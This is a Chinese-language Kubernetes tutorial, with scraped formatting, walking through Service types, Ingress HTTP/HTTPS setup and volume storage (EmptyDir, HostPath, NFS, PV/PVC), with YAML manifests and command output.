Masq 1 0 0 Service类型Service的资源清单文件： 12345678910111213141516kind: Service # 资源类型apiVersion: v1 # 资源版本metadata: # 元数据 name: service # 资源名称 namespace: dev # 命名空间spec: # 描述 selector: # 标签选择器，用于确定当前service代理哪些pod app: nginx type: # Service类型，指定service的访问方式 clusterIP: # 虚拟服务的ip地址 sessionAffinity: # session亲和性，支持ClientIP、None两个选项 ports: # 端口信息 - protocol: TCP port: 3017 # service端口 targetPort: 5003 # pod端口 nodePort: 31122 # 主机端口 ClusterIP：默认值，它是Kubernetes系统自动分配的虚拟IP，只能在集群内部访问 NodePort：将Service通过指定的Node上的端口暴露给外部，通过此方法，就可以在集群外部访问服务 LoadBalancer：使用外接负载均衡器完成到服务的负载分发，注意此模式需要外部云环境支持 ExternalName： 把集群外部的服务引入集群内部，直接使用 Service使用实验环境准备在使用service之前，首先利用Deployment创建出3个pod，注意要为pod设置app=nginx-pod的标签 创建deployment.yaml，内容如下： 1234567891011121314151617181920apiVersion: apps/v1kind: Deployment metadata: name: pc-deployment namespace: devspec: replicas: 3 selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80 123456789101112131415161718192021[root@k8s-master01 ~]# kubectl create -f deployment.yamldeployment.apps/pc-deployment created# 查看pod详情[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labelsNAME READY STATUS IP NODE LABELSpc-deployment-66cb59b984-8p84h 1/1 Running 10.244.1.39 node1 app=nginx-podpc-deployment-66cb59b984-vx8vx 1/1 Running 10.244.2.33 node2 app=nginx-podpc-deployment-66cb59b984-wnncx 1/1 Running 10.244.1.40 node1 app=nginx-pod# 为了方便后面的测试，修改下三台nginx的index.html页面（三台修改的IP地址不一致）# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh# echo &quot;10.244.1.39&quot; &gt; /usr/share/nginx/html/index.html#修改完毕之后，访问测试[root@k8s-master01 ~]# curl 10.244.1.3910.244.1.39[root@k8s-master01 ~]# curl 10.244.2.3310.244.2.33[root@k8s-master01 ~]# curl 10.244.1.4010.244.1.40 ClusterIP类型的Service创建service-clusterip.yaml文件 12345678910111213apiVersion: v1kind: Servicemetadata: name: service-clusterip namespace: devspec: selector: app: nginx-pod clusterIP: 10.97.97.97 # service的ip地址，如果不写，默认会生成一个 type: ClusterIP ports: - port: 80 # Service端口 targetPort: 80 # pod端口 1234567891011121314151617181920212223242526272829303132333435# 创建service[root@k8s-master01 ~]# kubectl create -f service-clusterip.yamlservice/service-clusterip created# 查看service[root@k8s-master01 ~]# kubectl get svc -n dev -o wideNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTORservice-clusterip ClusterIP 10.97.97.97 &lt;none&gt; 80/TCP 13s app=nginx-pod# 查看service的详细信息# 在这里有一个Endpoints列表，里面就是当前service可以负载到的服务入口[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n devName: service-clusteripNamespace: devLabels: &lt;none&gt;Annotations: &lt;none&gt;Selector: app=nginx-podType: ClusterIPIP: 10.97.97.97Port: &lt;unset&gt; 80/TCPTargetPort: 80/TCPEndpoints: 10.244.1.39:80,10.244.1.40:80,10.244.2.33:80Session Affinity: NoneEvents: &lt;none&gt;# 查看ipvs的映射规则[root@k8s-master01 ~]# ipvsadm -LnTCP 10.97.97.97:80 rr -&gt; 10.244.1.39:80 Masq 1 0 0 -&gt; 10.244.1.40:80 Masq 1 0 0 -&gt; 10.244.2.33:80 Masq 1 0 0# 访问10.97.97.97:80观察效果[root@k8s-master01 ~]# curl 10.97.97.97:8010.244.2.33 Endpoint Endpoint是kubernetes中的一个资源对象，存储在etcd中，用来记录一个service对应的所有pod的访问地址，它是根据service配置文件中selector描述产生的。 一个Service由一组Pod组成，这些Pod通过Endpoints暴露出来，Endpoints是实现实际服务的端点集合。换句话说，service和pod之间的联系是通过endpoints实现的。 负载分发策略 对Service的访问被分发到了后端的Pod上去，目前kubernetes提供了两种负载分发策略： 如果不定义，默认使用kube-proxy的策略，比如随机、轮询 基于客户端地址的会话保持模式，即来自同一个客户端发起的所有请求都会转发到固定的一个Pod上 此模式可以使在spec中添加sessionAffinity:ClientIP选项 12345678910111213141516171819202122232425262728293031323334# 查看ipvs的映射规则【rr 轮询】[root@k8s-master01 ~]# ipvsadm -LnTCP 10.97.97.97:80 rr -&gt; 10.244.1.39:80 Masq 1 0 0 -&gt; 10.244.1.40:80 Masq 1 0 0 -&gt; 10.244.2.33:80 Masq 1 0 0# 循环访问测试[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;10.244.1.4010.244.1.3910.244.2.3310.244.1.4010.244.1.3910.244.2.33# 修改分发策略----sessionAffinity:ClientIP# 查看ipvs规则【persistent 代表持久】[root@k8s-master01 ~]# ipvsadm -LnTCP 10.97.97.97:80 rr persistent 10800 -&gt; 10.244.1.39:80 Masq 1 0 0 -&gt; 10.244.1.40:80 Masq 1 0 0 -&gt; 10.244.2.33:80 Masq 1 0 0# 循环访问测试[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;10.244.2.3310.244.2.3310.244.2.33 # 删除service[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yamlservice &quot;service-clusterip&quot; deleted HeadLiness类型的Service在某些场景中，开发人员可能不想使用Service提供的负载均衡功能，而希望自己来控制负载均衡策略，针对这种情况，kubernetes提供了HeadLiness Service，这类Service不会分配Cluster IP，如果想要访问service，只能通过service的域名进行查询。 创建service-headliness.yaml 12345678910111213apiVersion: v1kind: Servicemetadata: name: service-headliness namespace: devspec: selector: app: nginx-pod clusterIP: None # 将clusterIP设置为None，即可创建headliness Service type: ClusterIP ports: - port: 80 targetPort: 80 12345678910111213141516171819202122232425262728293031323334# 创建service[root@k8s-master01 ~]# kubectl create -f service-headliness.yamlservice/service-headliness created# 获取service， 发现CLUSTER-IP未分配[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wideNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTORservice-headliness ClusterIP None &lt;none&gt; 80/TCP 11s app=nginx-pod# 查看service详情[root@k8s-master01 ~]# kubectl describe svc service-headliness -n devName: service-headlinessNamespace: devLabels: &lt;none&gt;Annotations: &lt;none&gt;Selector: app=nginx-podType: ClusterIPIP: NonePort: &lt;unset&gt; 80/TCPTargetPort: 80/TCPEndpoints: 10.244.1.39:80,10.244.1.40:80,10.244.2.33:80Session Affinity: NoneEvents: &lt;none&gt;# 查看域名的解析情况[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh/ # cat /etc/resolv.confnameserver 10.96.0.10search dev.svc.cluster.local svc.cluster.local cluster.local[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.localservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.40service-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.39service-headliness.dev.svc.cluster.local. 30 IN A 10.244.2.33 NodePort类型的Service在之前的样例中，创建的Service的ip地址只有集群内部才可以访问，如果希望将Service暴露给集群外部使用，那么就要使用到另外一种类型的Service，称为NodePort类型。NodePort的工作原理其实就是将service的端口映射到Node的一个端口上，然后就可以通过NodeIp:NodePort来访问service了。 创建service-nodeport.yaml 12345678910111213apiVersion: v1kind: Servicemetadata: name: service-nodeport namespace: devspec: selector: app: nginx-pod type: NodePort # service类型 ports: - port: 80 nodePort: 30002 # 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配 targetPort: 80 12345678910# 创建service[root@k8s-master01 ~]# kubectl create -f service-nodeport.yamlservice/service-nodeport created# 查看service[root@k8s-master01 ~]# kubectl get svc -n dev -o wideNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) SELECTORservice-nodeport NodePort 10.105.64.191 &lt;none&gt; 80:30002/TCP app=nginx-pod# 接下来可以通过电脑主机的浏览器去访问集群中任意一个nodeip的30002端口，即可访问到pod LoadBalancer类型的ServiceLoadBalancer和NodePort很相似，目的都是向外部暴露一个端口，区别在于LoadBalancer会在集群的外部再来做一个负载均衡设备，而这个设备需要外部环境支持的，外部服务发送到这个设备上的请求，会被设备负载之后转发到集群中。 ExternalName类型的ServiceExternalName类型的Service用于引入集群外部的服务，它通过externalName属性指定外部一个服务的地址，然后在集群内部访问此service就可以访问到外部的服务了。 12345678apiVersion: v1kind: Servicemetadata: name: service-externalname namespace: devspec: type: ExternalName # service类型 externalName: www.baidu.com #改成ip地址也可以 12345678910# 创建service[root@k8s-master01 ~]# kubectl create -f service-externalname.yamlservice/service-externalname created# 域名解析[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.localservice-externalname.dev.svc.cluster.local. 30 IN CNAME www.baidu.com.www.baidu.com. 30 IN CNAME www.a.shifen.com.www.a.shifen.com. 30 IN A 39.156.66.18www.a.shifen.com. 30 IN A 39.156.66.14 Ingress介绍在前面课程中已经提到，Service对集群之外暴露服务的主要方式有两种：NotePort和LoadBalancer，但是这两种方式，都有一定的缺点： NodePort方式的缺点是会占用很多集群机器的端口，那么当集群服务变多的时候，这个缺点就愈发明显 LB方式的缺点是每个service需要一个LB，浪费、麻烦，并且需要kubernetes之外设备的支持 基于这种现状，kubernetes提供了Ingress资源对象，Ingress只需要一个NodePort或者一个LB就可以满足暴露多个Service的需求。工作机制大致如下图表示： 实际上，Ingress相当于一个7层的负载均衡器，是kubernetes对反向代理的一个抽象，它的工作原理类似于Nginx，可以理解成在Ingress里建立诸多映射规则，Ingress Controller通过监听这些配置规则并转化成Nginx的反向代理配置 , 然后对外部提供服务。在这里有两个核心概念： ingress：kubernetes中的一个对象，作用是定义请求如何转发到service的规则 ingress controller：具体实现反向代理及负载均衡的程序，对ingress定义的规则进行解析，根据配置的规则来实现请求转发，实现方式有很多，比如Nginx, Contour, Haproxy等等 Ingress（以Nginx为例）的工作原理如下： 用户编写Ingress规则，说明哪个域名对应kubernetes集群中的哪个Service Ingress控制器动态感知Ingress服务规则的变化，然后生成一段对应的Nginx反向代理配置 Ingress控制器会将生成的Nginx配置写入到一个运行着的Nginx服务中，并动态更新 到此为止，其实真正在工作的就是一个Nginx了，内部配置了用户定义的请求转发规则 Ingress使用环境准备搭建ingress环境 1234567891011121314151617181920212223# 创建文件夹[root@k8s-master01 ~]# mkdir ingress-controller[root@k8s-master01 ~]# cd ingress-controller/# 获取ingress-nginx，本次案例使用的是0.30版本[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml# 修改mandatory.yaml文件中的仓库# 修改quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0# 为quay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0# 创建ingress-nginx[root@k8s-master01 ingress-controller]# kubectl apply -f ./# 查看ingress-nginx[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginxNAME READY STATUS RESTARTS AGEpod/nginx-ingress-controller-fbf967dd5-4qpbp 1/1 Running 0 12h# 查看service[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginxNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEingress-nginx NodePort 10.98.75.163 &lt;none&gt; 80:32240/TCP,443:31335/TCP 11h 准备service和pod 为了后面的实验比较方便，创建如下图所示的模型 创建tomcat-nginx.yaml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475apiVersion: apps/v1kind: Deploymentmetadata: name: nginx-deployment namespace: devspec: replicas: 3 selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80---apiVersion: apps/v1kind: Deploymentmetadata: name: tomcat-deployment namespace: devspec: replicas: 3 selector: matchLabels: app: tomcat-pod template: metadata: labels: app: tomcat-pod spec: containers: - name: tomcat image: tomcat:8.5-jre10-slim ports: - containerPort: 8080---apiVersion: v1kind: Servicemetadata: name: nginx-service namespace: devspec: selector: app: nginx-pod clusterIP: None type: ClusterIP ports: - port: 80 targetPort: 80---apiVersion: v1kind: Servicemetadata: name: tomcat-service namespace: devspec: selector: app: tomcat-pod clusterIP: None type: ClusterIP ports: - port: 8080 targetPort: 8080 12345678# 创建[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml# 查看[root@k8s-master01 ~]# kubectl get svc -n devNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEnginx-service ClusterIP None &lt;none&gt; 80/TCP 48stomcat-service ClusterIP None &lt;none&gt; 8080/TCP 48s Http代理创建ingress-http.yaml 123456789101112131415161718192021apiVersion: extensions/v1beta1kind: Ingressmetadata: name: ingress-http namespace: devspec: rules: - host: nginx.itheima.com http: paths: - path: / backend: serviceName: nginx-service servicePort: 80 - host: tomcat.itheima.com http: paths: - path: / backend: serviceName: tomcat-service servicePort: 8080 123456789101112131415161718192021# 创建[root@k8s-master01 ~]# kubectl create -f ingress-http.yamlingress.extensions/ingress-http created# 查看[root@k8s-master01 ~]# kubectl get ing ingress-http -n devNAME HOSTS ADDRESS PORTS AGEingress-http nginx.itheima.com,tomcat.itheima.com 80 22s# 查看详情[root@k8s-master01 ~]# kubectl describe ing ingress-http -n dev...Rules:Host Path Backends---- ---- --------nginx.itheima.com / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)tomcat.itheima.com / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)...# 接下来,在本地电脑上配置host文件,解析上面的两个域名到192.168.109.100(master)上# 然后,就可以分别访问tomcat.itheima.com:32240 和 nginx.itheima.com:32240 查看效果了 Https代理创建证书 12345# 生成证书openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/C=CN/ST=BJ/L=BJ/O=nginx/CN=itheima.com&quot;# 创建密钥kubectl create secret tls tls-secret --key tls.key --cert tls.crt 创建ingress-https.yaml 1234567891011121314151617181920212223242526apiVersion: extensions/v1beta1kind: Ingressmetadata: name: ingress-https namespace: devspec: tls: - hosts: - nginx.itheima.com - tomcat.itheima.com secretName: tls-secret # 指定秘钥 rules: - host: nginx.itheima.com http: paths: - path: / backend: serviceName: nginx-service servicePort: 80 - host: tomcat.itheima.com http: paths: - path: / backend: serviceName: tomcat-service servicePort: 8080 12345678910111213141516171819202122# 创建[root@k8s-master01 ~]# kubectl create -f ingress-https.yamlingress.extensions/ingress-https created# 查看[root@k8s-master01 ~]# kubectl get ing ingress-https -n devNAME HOSTS ADDRESS PORTS AGEingress-https nginx.itheima.com,tomcat.itheima.com 10.104.184.38 80, 443 2m42s# 查看详情[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev...TLS: tls-secret terminates nginx.itheima.com,tomcat.itheima.comRules:Host Path Backends---- ---- --------nginx.itheima.com / nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)tomcat.itheima.com / tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)...# 下面可以通过浏览器访问https://nginx.itheima.com:31335 和 https://tomcat.itheima.com:31335来查看了 数据存储在前面已经提到，容器的生命周期可能很短，会被频繁地创建和销毁。那么容器在销毁时，保存在容器中的数据也会被清除。这种结果对用户来说，在某些情况下是不乐意看到的。为了持久化保存容器的数据，kubernetes引入了Volume的概念。 Volume是Pod中能够被多个容器访问的共享目录，它被定义在Pod上，然后被一个Pod里的多个容器挂载到具体的文件目录下，kubernetes通过Volume实现同一个Pod中不同容器之间的数据共享以及数据的持久化存储。Volume的生命容器不与Pod中单个容器的生命周期相关，当容器终止或者重启时，Volume中的数据也不会丢失。 kubernetes的Volume支持多种类型，比较常见的有下面几个： 简单存储：EmptyDir、HostPath、NFS 高级存储：PV、PVC 配置存储：ConfigMap、Secret 基本存储EmptyDirEmptyDir是最基础的Volume类型，一个EmptyDir就是Host上的一个空目录。 EmptyDir是在Pod被分配到Node时创建的，它的初始内容为空，并且无须指定宿主机上对应的目录文件，因为kubernetes会自动分配一个目录，当Pod销毁时， EmptyDir中的数据也会被永久删除。 EmptyDir用途如下： 临时空间，例如用于某些应用程序运行时所需的临时目录，且无须永久保留 一个容器需要从另一个容器中获取数据的目录（多容器共享目录） 接下来，通过一个容器之间文件共享的案例来使用一下EmptyDir。 在一个Pod中准备两个容器nginx和busybox，然后声明一个Volume分别挂在到两个容器的目录中，然后nginx容器负责向Volume中写日志，busybox中通过命令将日志内容读到控制台。 创建一个volume-emptydir.yaml 1234567891011121314151617181920212223apiVersion: v1kind: Podmetadata: name: volume-emptydir namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80 volumeMounts: # 将logs-volume挂在到nginx容器中，对应的目录为 /var/log/nginx - name: logs-volume mountPath: /var/log/nginx - name: busybox image: busybox:1.30 command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;tail -f /logs/access.log&quot;] # 初始命令，动态读取指定文件中内容 volumeMounts: # 将logs-volume 挂在到busybox容器中，对应的目录为 /logs - name: logs-volume mountPath: /logs volumes: # 声明volume， name为logs-volume，类型为emptyDir - name: logs-volume emptyDir: {} 12345678910111213141516# 创建Pod[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yamlpod/volume-emptydir created# 查看pod[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE ...... volume-emptydir 2/2 Running 0 97s 10.42.2.9 node1 ......# 通过podIp访问nginx[root@k8s-master01 ~]# curl 10.42.2.9......# 通过kubectl logs命令查看指定容器的标准输出[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox10.42.1.0 - - [27/Jun/2021:15:08:54 +0000] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;-&quot; HostPath上节课提到，EmptyDir中数据不会被持久化，它会随着Pod的结束而销毁，如果想简单的将数据持久化到主机中，可以选择HostPath。 HostPath就是将Node主机中一个实际目录挂在到Pod中，以供容器使用，这样的设计就可以保证Pod销毁了，但是数据依据可以存在于Node主机上。 创建一个volume-hostpath.yaml： 12345678910111213141516171819202122232425apiVersion: v1kind: Podmetadata: name: volume-hostpath namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80 volumeMounts: - name: logs-volume mountPath: /var/log/nginx - name: busybox image: busybox:1.30 command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;tail -f /logs/access.log&quot;] volumeMounts: - name: logs-volume mountPath: /logs volumes: - name: logs-volume hostPath: path: /root/logs type: DirectoryOrCreate # 目录存在就使用，不存在就先创建后使用 12345678关于type的值的一点说明： DirectoryOrCreate 目录存在就使用，不存在就先创建后使用 Directory 目录必须存在 FileOrCreate 文件存在就使用，不存在就先创建后使用 File 文件必须存在 Socket unix套接字必须存在 CharDevice 字符设备必须存在 BlockDevice 块设备必须存在 123456789101112131415161718# 创建Pod[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yamlpod/volume-hostpath created# 查看Pod[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE ......pod-volume-hostpath 2/2 Running 0 16s 10.42.2.10 node1 ......#访问nginx[root@k8s-master01 ~]# curl 10.42.2.10# 接下来就可以去host的/root/logs目录下查看存储的文件了### 注意: 下面的操作需要到Pod所在的节点运行（案例中是node1）[root@node1 ~]# ls /root/logs/access.log error.log# 同样的道理，如果在此目录下创建一个文件，到容器中也是可以看到的 NFSHostPath可以解决数据持久化的问题，但是一旦Node节点故障了，Pod如果转移到了别的节点，又会出现问题了，此时需要准备单独的网络存储系统，比较常用的用NFS、CIFS。 NFS是一个网络文件存储系统，可以搭建一台NFS服务器，然后将Pod中的存储直接连接到NFS系统上，这样的话，无论Pod在节点上怎么转移，只要Node跟NFS的对接没问题，数据就可以成功访问。 1）首先要准备nfs的服务器，这里为了简单，直接是master节点做nfs服务器 12345678910111213# 在nfs上安装nfs服务[root@nfs ~]# yum install nfs-utils -y# 准备一个共享目录[root@nfs ~]# mkdir /root/data/nfs -pv# 将共享目录以读写权限暴露给192.168.5.0/24网段中的所有主机[root@nfs ~]# vim /etc/exports[root@nfs ~]# more /etc/exports/root/data/nfs 192.168.5.0/24(rw,no_root_squash)# 启动nfs服务[root@nfs ~]# systemctl restart nfs 2）接下来，要在的每个node节点上都安装下nfs，这样的目的是为了node节点可以驱动nfs设备 12# 在node上安装nfs服务，注意不需要启动[root@k8s-master01 ~]# yum install nfs-utils -y 3）接下来，就可以编写pod的配置文件了，创建volume-nfs.yaml 12345678910111213141516171819202122232425apiVersion: v1kind: Podmetadata: name: volume-nfs namespace: devspec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80 volumeMounts: - name: logs-volume mountPath: /var/log/nginx - name: busybox image: busybox:1.30 command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;tail -f /logs/access.log&quot;] volumeMounts: - name: logs-volume mountPath: /logs volumes: - name: logs-volume nfs: server: 192.168.5.6 #nfs服务器地址 path: /root/data/nfs #共享文件路径 4）最后，运行下pod，观察结果 123456789101112# 创建pod[root@k8s-master01 ~]# kubectl create -f volume-nfs.yamlpod/volume-nfs created# 查看pod[root@k8s-master01 ~]# kubectl get pods volume-nfs -n devNAME READY STATUS RESTARTS AGEvolume-nfs 2/2 Running 0 2m9s# 查看nfs服务器上的共享目录，发现已经有文件了[root@k8s-master01 ~]# ls /root/data/access.log error.log 高级存储前面已经学习了使用NFS提供存储，此时就要求用户会搭建NFS系统，并且会在yaml配置nfs。由于kubernetes支持的存储系统有很多，要求客户全都掌握，显然不现实。为了能够屏蔽底层存储实现的细节，方便用户使用， kubernetes引入PV和PVC两种资源对象。 PV（Persistent Volume）是持久化卷的意思，是对底层的共享存储的一种抽象。一般情况下PV由kubernetes管理员进行创建和配置，它与底层具体的共享存储技术有关，并通过插件完成与共享存储的对接。 PVC（Persistent Volume Claim）是持久卷声明的意思，是用户对于存储需求的一种声明。换句话说，PVC其实就是用户向kubernetes系统发出的一种资源需求申请。 使用了PV和PVC之后，工作可以得到进一步的细分： 存储：存储工程师维护 PV： kubernetes管理员维护 PVC：kubernetes用户维护 PVPV是存储资源的抽象，下面是资源清单文件: 1234567891011apiVersion: v1 kind: PersistentVolumemetadata: name: pv2spec: nfs: # 存储类型，与底层真正存储对应 capacity: # 存储能力，目前只支持存储空间的设置 storage: 2Gi accessModes: # 访问模式 storageClassName: # 存储类别 persistentVolumeReclaimPolicy: # 回收策略 PV 的关键配置参数说明： 存储类型 底层实际存储的类型，kubernetes支持多种存储类型，每种存储类型的配置都有所差异 存储能力（capacity） 目前只支持存储空间的设置( storage=1Gi )，不过未来可能会加入IOPS、吞吐量等指标的配置 访问模式（accessModes） 用于描述用户应用对存储资源的访问权限，访问权限包括下面几种方式： ReadWriteOnce（RWO）：读写权限，但是只能被单个节点挂载 ReadOnlyMany（ROX）： 只读权限，可以被多个节点挂载 ReadWriteMany（RWX）：读写权限，可以被多个节点挂载 需要注意的是，底层不同的存储类型可能支持的访问模式不同 回收策略（persistentVolumeReclaimPolicy） 当PV不再被使用了之后，对其的处理方式。目前支持三种策略： Retain （保留） 保留数据，需要管理员手工清理数据 Recycle（回收） 清除 PV 中的数据，效果相当于执行 rm -rf /thevolume/* Delete （删除） 与 PV 相连的后端存储完成 volume 的删除操作，当然这常见于云服务商的存储服务 需要注意的是，底层不同的存储类型可能支持的回收策略不同 存储类别 PV可以通过storageClassName参数指定一个存储类别 具有特定类别的PV只能与请求了该类别的PVC进行绑定 未设定类别的PV则只能与不请求任何类别的PVC进行绑定 状态（status） 一个 PV 的生命周期中，可能会处于4中不同的阶段： Available（可用）： 表示可用状态，还未被任何 PVC 绑定 Bound（已绑定）： 表示 PV 已经被 PVC 绑定 Released（已释放）： 表示 PVC 被删除，但是资源还未被集群重新声明 Failed（失败）： 表示该 PV 的自动回收失败 实验 使用NFS作为存储，来演示PV的使用，创建3个PV，对应NFS中的3个暴露的路径。 准备NFS环境 1234567891011# 创建目录[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv# 暴露服务[root@nfs ~]# more /etc/exports/root/data/pv1 192.168.5.0/24(rw,no_root_squash)/root/data/pv2 192.168.5.0/24(rw,no_root_squash)/root/data/pv3 192.168.5.0/24(rw,no_root_squash)# 重启服务[root@nfs ~]# systemctl restart nfs 创建pv.yaml 123456789101112131415161718192021222324252627282930313233343536373839404142434445apiVersion: v1kind: PersistentVolumemetadata: name: pv1spec: capacity: storage: 1Gi accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain nfs: path: /root/data/pv1 server: 192.168.5.6---apiVersion: v1kind: PersistentVolumemetadata: name: pv2spec: capacity: storage: 2Gi accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain nfs: path: /root/data/pv2 server: 192.168.5.6 ---apiVersion: v1kind: PersistentVolumemetadata: name: pv3spec: capacity: storage: 3Gi accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain nfs: path: /root/data/pv3 server: 192.168.5.6 123456789101112# 创建 pv[root@k8s-master01 ~]# kubectl create -f pv.yamlpersistentvolume/pv1 createdpersistentvolume/pv2 createdpersistentvolume/pv3 created# 查看pv[root@k8s-master01 ~]# kubectl get pv -o wideNAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS AGE VOLUMEMODEpv1 1Gi RWX Retain Available 10s Filesystempv2 2Gi RWX Retain Available 10s Filesystempv3 3Gi RWX Retain Available 9s Filesystem PVCPVC是资源的申请，用来声明对存储空间、访问模式、存储类别需求信息。下面是资源清单文件: 123456789101112apiVersion: v1kind: PersistentVolumeClaimmetadata: name: pvc namespace: devspec: accessModes: # 访问模式 selector: # 采用标签对PV选择 storageClassName: # 存储类别 resources: # 请求空间 requests: storage: 5Gi PVC 的关键配置参数说明： 访问模式（accessModes） 用于描述用户应用对存储资源的访问权限 选择条件（selector） 通过Label Selector的设置，可使PVC对于系统中己存在的PV进行筛选 存储类别（storageClassName） PVC在定义时可以设定需要的后端存储的类别，只有设置了该class的pv才能被系统选出 资源请求（Resources ） 描述对存储资源的请求 实验 创建pvc.yaml，申请pv 1234567891011121314151617181920212223242526272829303132333435apiVersion: v1kind: PersistentVolumeClaimmetadata: name: pvc1 namespace: devspec: accessModes: - ReadWriteMany resources: requests: storage: 1Gi---apiVersion: v1kind: PersistentVolumeClaimmetadata: name: pvc2 namespace: devspec: accessModes: - ReadWriteMany resources: requests: storage: 1Gi---apiVersion: v1kind: PersistentVolumeClaimmetadata: name: pvc3 namespace: devspec: accessModes: - ReadWriteMany resources: requests: storage: 1Gi 12345678910111213141516171819# 创建pvc[root@k8s-master01 ~]# kubectl create -f pvc.yamlpersistentvolumeclaim/pvc1 createdpersistentvolumeclaim/pvc2 createdpersistentvolumeclaim/pvc3 created# 查看pvc[root@k8s-master01 ~]# kubectl get pvc -n dev -o wideNAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE VOLUMEMODEpvc1 Bound pv1 1Gi RWX 15s Filesystempvc2 Bound pv2 2Gi RWX 15s Filesystempvc3 Bound pv3 3Gi RWX 15s Filesystem# 查看pv[root@k8s-master01 ~]# kubectl get pv -o wideNAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM AGE VOLUMEMODEpv1 1Gi RWx Retain Bound dev/pvc1 3h37m Filesystempv2 2Gi RWX Retain Bound dev/pvc2 3h37m Filesystempv3 3Gi RWX Retain Bound dev/pvc3 3h37m Filesystem 创建pods.yaml, 使用pv 12345678910111213141516171819202122232425262728293031323334353637apiVersion: v1kind: Podmetadata: name: pod1 namespace: devspec: containers: - name: busybox image: busybox:1.30 command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;while true;do echo pod1 &gt;&gt; /root/out.txt; sleep 10; done;&quot;] volumeMounts: - name: volume mountPath: /root/ volumes: - name: volume persistentVolumeClaim: claimName: pvc1 readOnly: false---apiVersion: v1kind: Podmetadata: name: pod2 namespace: devspec: containers: - name: busybox image: busybox:1.30 command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;while true;do echo pod2 &gt;&gt; /root/out.txt; sleep 10; done;&quot;] volumeMounts: - name: volume mountPath: /root/ volumes: - name: volume persistentVolumeClaim: claimName: pvc2 readOnly: false 1234567891011121314151617181920212223242526272829303132# 创建pod[root@k8s-master01 ~]# kubectl create -f pods.yamlpod/pod1 createdpod/pod2 created# 查看pod[root@k8s-master01 ~]# kubectl get pods -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE pod1 1/1 Running 0 14s 10.244.1.69 node1 pod2 1/1 Running 0 14s 10.244.1.70 node1 # 查看pvc[root@k8s-master01 ~]# kubectl get pvc -n dev -o wideNAME STATUS VOLUME CAPACITY ACCESS MODES AGE VOLUMEMODEpvc1 Bound pv1 1Gi RWX 94m Filesystempvc2 Bound pv2 2Gi RWX 94m Filesystempvc3 Bound pv3 3Gi RWX 94m Filesystem# 查看pv[root@k8s-master01 ~]# kubectl get pv -n dev -o wideNAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM AGE VOLUMEMODEpv1 1Gi RWX Retain Bound dev/pvc1 5h11m Filesystempv2 2Gi RWX Retain Bound dev/pvc2 5h11m Filesystempv3 3Gi RWX Retain Bound dev/pvc3 5h11m Filesystem# 查看nfs中的文件存储[root@nfs ~]# more /root/data/pv1/out.txtnode1node1[root@nfs ~]# more 